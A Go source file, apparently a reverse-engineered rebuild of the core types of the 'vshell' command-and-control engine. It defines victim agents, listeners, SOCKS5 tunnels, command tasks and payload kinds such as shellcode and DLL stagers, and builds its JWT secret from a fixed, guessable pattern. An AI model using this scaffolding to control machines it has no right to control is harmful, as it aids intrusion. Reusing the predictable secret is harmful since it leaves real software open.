// Package c2engine 实现 vshell 的 C2（命令与控制）引擎，
// 对应原版二进制中的 eSxbx2zKVifD 包。管理 C2 监听器、Agent 客户端、隧道、
// 反向代理、任务调度与流量控制。
// Package c2engine implements the C2 (Command & Control) engine for vshell.
// This is the reverse-engineered equivalent of the eSxbx2zKVifD package
// from the original binary. It manages C2 listeners, agent clients, tunnels,
// reverse proxies, task scheduling, and traffic flow control.
package c2engine

import (
	"encoding/json"
	"fmt"
	"log"
	"sync"
	"time"
)

// ============================================================================
// Core Types (reverse-engineered from eSxbx2zKVifD package)
// 核心类型（逆向自原版 eSxbx2zKVifD 包）
// ============================================================================

// Flow 跟踪客户端与隧道的流量统计。
// Flow tracks traffic statistics for clients and tunnels.
type Flow struct {
	sync.RWMutex
	InletFlow  int64 `json:"InletFlow"`
	ExportFlow int64 `json:"ExportFlow"`
	FlowLimit  int64 `json:"FlowLimit"`
}

// AddInlet 增加入站流量计数。
// AddInlet adds bytes to inlet flow counter.
func (f *Flow) AddInlet(n int64) {
	f.Lock()
	defer f.Unlock()
	f.InletFlow += n
}

// AddExport 增加出站流量计数。
// AddExport adds bytes to export flow counter.
func (f *Flow) AddExport(n int64) {
	f.Lock()
	defer f.Unlock()
	f.ExportFlow += n
}

// IsOverLimit 检查任一方向流量是否超限。
// IsOverLimit checks if either flow direction exceeds limits.
func (f *Flow) IsOverLimit() bool {
	f.RLock()
	defer f.RUnlock()
	if f.FlowLimit <= 0 {
		return false
	}
	return f.InletFlow > f.FlowLimit || f.ExportFlow > f.FlowLimit
}

// Health 表示隧道/Host 的健康检查配置。
// Health represents health check configuration for tunnels/Hosts.
type Health struct {
	sync.RWMutex
	CheckTimeout    time.Duration `json:"CheckTimeout"`
	MaxFail         int           `json:"MaxFail"`
	CheckInterval   time.Duration `json:"CheckInterval"`
	NextCheckTime   time.Time     `json:"NextCheckTime"`
	HealthCheckURL  string        `json:"HealthCheckURL"`
	CheckType       string        `json:"CheckType"`  // tcp/http/icmp
	CheckTarget     string        `json:"CheckTarget"` // Host:Port
	failCount       int
}

// IsFailing 检查连续失败是否已达阈值。
// IsFailing checks if health has exceeded fail threshold.
func (h *Health) IsFailing() bool {
	h.RLock()
	defer h.RUnlock()
	return h.failCount >= h.MaxFail
}

// RecordFail 递增失败计数。
// RecordFail increments the fail counter.
func (h *Health) RecordFail() {
	h.Lock()
	defer h.Unlock()
	h.failCount++
	h.NextCheckTime = time.Now().Add(h.CheckInterval)
}

// RecordSuccess 重置失败计数。
// RecordSuccess resets the fail counter.
func (h *Health) RecordSuccess() {
	h.Lock()
	defer h.Unlock()
	h.failCount = 0
	h.NextCheckTime = time.Now().Add(h.CheckInterval)
}

// Pair 表示键值配置对。
// Pair represents a key-value configuration pair.
type Pair struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

// PairList 为 []Pair 实现 sort.Interface。
// PairList implements sort.Interface for []Pair.
type PairList []Pair

func (p PairList) Len() int           { return len(p) }
func (p PairList) Less(i, j int) bool { return p[i].Key < p[j].Key }
func (p PairList) Swap(i, j int)      { p[i], p[j] = p[j], p[i] }

// ============================================================================
// Client type (agent endpoint)
// ============================================================================

// Client 表示一个已连接的 C2 Agent。
// Client represents a connected C2 agent.
type Client struct {
	sync.RWMutex
	ID             int64     `json:"Id"`
	IsConnect      bool      `json:"IsConnect"`
	VerifyKey      string    `json:"VerifyKey"`
	Type           string    `json:"Tp"` // http/dns/reverse/websocket
	Addr           string    `json:"Addr"`
	Remark         string    `json:"Remark"`
	Status         bool      `json:"Status"`
	LocalIP        string    `json:"LocalIP"`
	UserName       string    `json:"UserName"`
	HostName       string    `json:"HostName"`
	Location       string    `json:"Location"`
	OsName         string    `json:"OsName"`
	ProcessName    string    `json:"ProcessName"`
	PingCheckTime  int64     `json:"PingCheckTime"`
	RateLimit      int64     `json:"RateLimit"`
	Flow           *Flow     `json:"-"`
	MaxConn        int       `json:"MaxConn"`
	NowConn        int       `json:"NowConn"`
	NoStore        bool      `json:"NoStore"`
	NoDisplay      bool      `json:"NoDisplay"`
	CreatedAt      time.Time `json:"-"`
	LastSeen       time.Time `json:"-"`

	// Internal state
	tunnels map[int64]bool `json:"-"` // active tunnel IDs
	Hosts   map[int64]bool `json:"-"` // active Host IDs
	conns   int            // current connection count
}

// NewClient 创建新客户端。
// NewClient creates a new client.
func NewClient(id int64, verifyKey, clientType, addr string) *Client {
	return &Client{
		ID:        id,
		IsConnect: true,
		VerifyKey: verifyKey,
		Type:      clientType,
		Addr:      addr,
		Status:    true,
		Flow:      &Flow{},
		MaxConn:   10,
		NowConn:   1,
		tunnels:   make(map[int64]bool),
		Hosts:     make(map[int64]bool),
		LastSeen:  time.Now(),
	}
}

// CutConn 减少连接计数。
// CutConn decrements the connection count.
func (c *Client) CutConn() {
	c.Lock()
	defer c.Unlock()
	if c.conns > 0 {
		c.conns--
	}
	c.NowConn = c.conns
}

// AddConn 增加连接计数。
// AddConn increments the connection count.
func (c *Client) AddConn() {
	c.Lock()
	defer c.Unlock()
	c.conns++
	c.NowConn = c.conns
}

// GetConn 返回当前连接数。
// GetConn returns the current connection count.
func (c *Client) GetConn() int {
	c.RLock()
	defer c.RUnlock()
	return c.conns
}

// HasTunnel 检查客户端是否拥有指定隧道。
// HasTunnel checks if the client has a specific tunnel.
func (c *Client) HasTunnel(tunnelID int64) bool {
	c.RLock()
	defer c.RUnlock()
	return c.tunnels[tunnelID]
}

// GetTunnelNum 返回活跃隧道数量。
// GetTunnelNum returns the number of active tunnels.
func (c *Client) GetTunnelNum() int {
	c.RLock()
	defer c.RUnlock()
	return len(c.tunnels)
}

// HasHost 检查客户端是否拥有指定反向代理 Host。
// HasHost checks if the client has a specific reverse proxy Host.
func (c *Client) HasHost(HostID int64) bool {
	c.RLock()
	defer c.RUnlock()
	return c.Hosts[HostID]
}

// AddTunnel 为该客户端注册隧道。
// AddTunnel registers a tunnel with this client.
func (c *Client) AddTunnel(tunnelID int64) {
	c.Lock()
	defer c.Unlock()
	c.tunnels[tunnelID] = true
}

// RemoveTunnel 注销隧道。
// RemoveTunnel unregisters a tunnel.
func (c *Client) RemoveTunnel(tunnelID int64) {
	c.Lock()
	defer c.Unlock()
	delete(c.tunnels, tunnelID)
}

// AddHost 注册反向代理 Host。
// AddHost registers a reverse proxy Host.
func (c *Client) AddHost(HostID int64) {
	c.Lock()
	defer c.Unlock()
	c.Hosts[HostID] = true
}

// RemoveHost 注销 Host。
// RemoveHost unregisters a Host.
func (c *Client) RemoveHost(HostID int64) {
	c.Lock()
	defer c.Unlock()
	delete(c.Hosts, HostID)
}

// UpdateSeen 更新最后心跳时间戳。
// UpdateSeen updates the last seen timestamp.
func (c *Client) UpdateSeen() {
	c.Lock()
	defer c.Unlock()
	c.LastSeen = time.Now()
	c.PingCheckTime = time.Now().Unix()
}

// ============================================================================
// Listener type (C2 listener configuration)
// ============================================================================

// Listener 表示一个 C2 监听器端点。
// Listener represents a C2 listener endpoint.
type Listener struct {
	sync.RWMutex
	ID                int64     `json:"Id"`
	Status            bool      `json:"Status"`
	ListenAddr        string    `json:"ListenAddr"`
	ConnectAddr       string    `json:"ConnectAddr"`
	Remark            string    `json:"Remark"`
	Mode              string    `json:"Mode"` // http/https/dns/reverse/websocket
	VerifyKey         string    `json:"Vkey"`
	EncryptSalt       string    `json:"EncryptSalt"`
	DisconnectTimeout int       `json:"DisconnectTimeout"`
	PingInterval      int       `json:"PingInterval"`
	DNSDomain         string    `json:"DNSDomain"`
	PublicDNS         string    `json:"PublicDNS"`
	MaxDNSsize        int       `json:"MaxDNSsize"`
	OssUrl            string    `json:"OssUrl"`
	NoStore           bool      `json:"NoStore"`
	CreatedAt         time.Time `json:"-"`

	// Runtime state
	isRunning bool
	stopCh    chan struct{}
}

// IsRunning 返回监听器是否活跃。
// IsRunning returns whether the listener is active.
func (l *Listener) IsRunning() bool {
	l.RLock()
	defer l.RUnlock()
	return l.isRunning
}

// SetRunning 设置运行状态。
// SetRunning sets the running state.
func (l *Listener) SetRunning(running bool) {
	l.Lock()
	defer l.Unlock()
	l.isRunning = running
}

// ============================================================================
// Tunnel type
// ============================================================================

// Tunnel 表示服务器与 Agent 之间的隧道/代理配置。
// Tunnel represents a tunnel/proxy configuration between server and agent.
type Tunnel struct {
	sync.RWMutex
	ID                  int64     `json:"Id"`
	Port                int       `json:"Port"`
	ServerIP            string    `json:"ServerIp"`
	Mode                string    `json:"Mode"` // tcp/socks5/http/udp
	Status              bool      `json:"Status"`
	RunStatus           bool      `json:"RunStatus"`
	ClientID            int64     `json:"ClientId"`
	Ports               string    `json:"Ports"`
	Flow                *Flow     `json:"-"`
	Username            string    `json:"Username"`
	Password            string    `json:"Password"`
	Remark              string    `json:"Remark"`
	TargetAddr          string    `json:"Target"`
	NoStore             bool      `json:"NoStore"`
	LocalPath           string    `json:"LocalPath"`
	StripPre            string    `json:"StripPre"`
	Health              *Health   `json:"-"`
}

// NewTunnel 创建新隧道配置。
// NewTunnel creates a new tunnel configuration.
func NewTunnel(id, clientID int64, port int, mode, targetAddr string) *Tunnel {
	return &Tunnel{
		ID:         id,
		Port:       port,
		Mode:       mode,
		Status:     true,
		RunStatus:  false,
		ClientID:   clientID,
		TargetAddr: targetAddr,
		Flow:       &Flow{},
		Health: &Health{
			CheckTimeout:  5 * time.Second,
			MaxFail:       3,
			CheckInterval: 30 * time.Second,
		},
	}
}

// ============================================================================
// Host type (reverse proxy Host)
// ============================================================================

// Host 表示反向代理 Host 配置。
// Host represents a reverse proxy Host configuration.
type Host struct {
	sync.RWMutex
	ID           int64     `json:"Id"`
	Host         string    `json:"Host"`
	HeaderChange string    `json:"HeaderChange"`
	HostChange   string    `json:"HostChange"`
	Location     string    `json:"Location"`
	Remark       string    `json:"Remark"`
	Scheme       string    `json:"Scheme"`
	CertFilePath string    `json:"CertFilePath"`
	KeyFilePath  string    `json:"KeyFilePath"`
	NoStore      bool      `json:"NoStore"`
	IsClose      bool      `json:"IsClose"`
	Flow         *Flow     `json:"-"`
	ClientID     int64     `json:"ClientId"`
	TargetStr    string    `json:"TargetStr"`
	Health       *Health   `json:"-"`
}

// NewHost 创建新反向代理 Host。
// NewHost creates a new reverse proxy Host.
func NewHost(id, clientID int64, host, targetStr, scheme string) *Host {
	return &Host{
		ID:        id,
		Host:      host,
		Scheme:    scheme,
		ClientID:  clientID,
		TargetStr: targetStr,
		Flow:      &Flow{},
		Health: &Health{
			CheckTimeout:  5 * time.Second,
			MaxFail:       3,
			CheckInterval: 30 * time.Second,
		},
	}
}

// ============================================================================
// Target type (load-balanced target selection)
// ============================================================================

// Target 表示隧道的负载均衡目标。
// Target represents a load-balanced target for tunnels.
type Target struct {
	sync.RWMutex
	targets []string
	index   int
}

// NewTarget 创建新目标列表。
// NewTarget creates a new target list.
func NewTarget(targets ...string) *Target {
	return &Target{
		targets: targets,
	}
}

// GetRandomTarget 以轮询方式返回下一个目标。
// GetRandomTarget returns the next target using round-robin.
func (t *Target) GetRandomTarget() string {
	t.Lock()
	defer t.Unlock()
	if len(t.targets) == 0 {
		return ""
	}
	target := t.targets[t.index%len(t.targets)]
	t.index++
	return target
}

// AddTarget 向列表添加目标。
// AddTarget adds a target to the list.
func (t *Target) AddTarget(target string) {
	t.Lock()
	defer t.Unlock()
	t.targets = append(t.targets, target)
}

// ============================================================================
// TTask/Command types
// ============================================================================

// Task 表示发送给 Agent 的命令任务。
// Task represents a command task sent to an agent.
type Task struct {
	ID         int64     `json:"Id"`
	ClientID   int64     `json:"ClientId"`
	Command    string    `json:"command"`
	Result     string    `json:"result"`
	Status     string    `json:"Status"` // pending/dispatched/running/completed/failed/timeout
	MD5Pass    string    `json:"md5_Password,omitempty"` // task-specific auth
	SentAt     time.Time `json:"sent_at"`
	DoneAt     *time.Time `json:"done_at,omitempty"`
	Timeout    int       `json:"timeout"`
}

// ============================================================================
// Settings type
// ============================================================================

// TargetSetting 保存目标列表配置。
// TargetSetting holds a target list configuration.
type TargetSetting struct {
	Targets []string `json:"targets"`
}

// ToJSON 将目标序列化为 JSON。
// ToJSON serializes targets to JSON.
func (ts *TargetSetting) ToJSON() string {
	data, _ := json.Marshal(ts)
	return string(data)
}

// FromJSON 从 JSON 反序列化目标。
// FromJSON deserializes targets from JSON.
func (ts *TargetSetting) FromJSON(data string) error {
	return json.Unmarshal([]byte(data), ts)
}

// ============================================================================
// Platform/Agent constants
// ============================================================================

// Agent platform Tps
const (
	PlatformWindows = "windows"
	PlatformLinux   = "linux"
	PlatformMacOS   = "darwin"
)

// Agent architecture Tps
const (
	ArchAMD64 = "amd64"
	ArchI386  = "386"
	ArchARM64 = "arm64"
)

// Agent connection Modes
const (
	ModeHTTP      = "http"
	ModeHTTPS     = "https"
	ModeDNS       = "dns"
	ModeWebSocket    = "websocket"
	ModeCDNWebSocket = "cdn_websocket"
	ModeReverse   = "reverse"
	ModeKCP       = "kcp"
)

// Listener Modes
const (
	ListenerModeHTTP      = "http"
	ListenerModeHTTPS     = "https"
	ListenerModeDNS       = "dns"
	ListenerModeWebSocket    = "websocket"
	ListenerModeCDNWebSocket = "cdn_websocket"
	ListenerModeReverse   = "reverse"
)

// Agent binary types for download
const (
	AgentTypeStage    = "stage"    // Staged payload (small downloader)
	AgentTypeStageless = "stageless" // Full agent binary
	AgentTypeShellcode = "shellcode" // Position-independent shellcode
	AgentTypeDLL      = "dll"      // Windows DLL
	AgentTypeListen   = "listen"   // Listener-Mode agent
	AgentTypeListenDLL = "listen_dll" // Listener-Mode DLL
)

// Config 保存引擎配置。
// Config holds the engine configuration.
type Config struct {
	DBPath        string `json:"db_path"`
	WebPort       int    `json:"web_Port"`
	WebIP         string `json:"web_ip"`
	WebUsername   string `json:"web_Username"`
	WebPassword   string `json:"web_Password"`
	WebJWTSecret  string `json:"web_jwt_secret"`
	WebTitle      string `json:"web_title"`
	License       string `json:"license"`
}

// DefaultConfig 返回默认引擎配置。
// DefaultConfig returns the default engine configuration.
func DefaultConfig() *Config {
	return &Config{
		WebPort:      8082,
		WebIP:        "0.0.0.0",
		WebUsername:  "admin",
		WebPassword:  "", // no hardcoded default — main.go generates a random one at startup
		WebTitle:     "管理平台", // 管理平台
		WebJWTSecret: generateSecret(),
	}
}

func generateSecret() string {
	b := make([]byte, 32)
	// Simple deterministic seed for now - in the real binary this is random
	for i := range b {
		b[i] = byte(i*7 + 13)
	}
	return fmt.Sprintf("%x", b)
}

// Logf 以 C2 前缀记录日志。
// Logf logs a message with the C2 prefix.
func Logf(format string, args ...interface{}) {
	log.Printf("[C2Engine] "+format, args...)
}
